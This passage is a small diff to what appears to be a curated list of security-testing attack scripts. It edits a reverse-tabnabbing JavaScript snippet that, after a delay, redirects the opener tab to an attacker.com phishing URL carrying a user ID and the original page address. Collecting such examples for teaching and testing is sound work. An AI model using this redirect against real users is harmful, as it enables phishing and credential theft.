@@ -18,7 +18,7 @@ A curated list of script and attack for security testing purposes and knowledgem
           // Wait for the deployment of the phishing site.
           setTimeout(() => {
             window.opener.location =
-              `https://attacker.com/${randomUserID}/${window.opener.location}`
+              `//attacker.com/${randomUserID}/${window.opener.location}`
 
           }, 8000)
         };
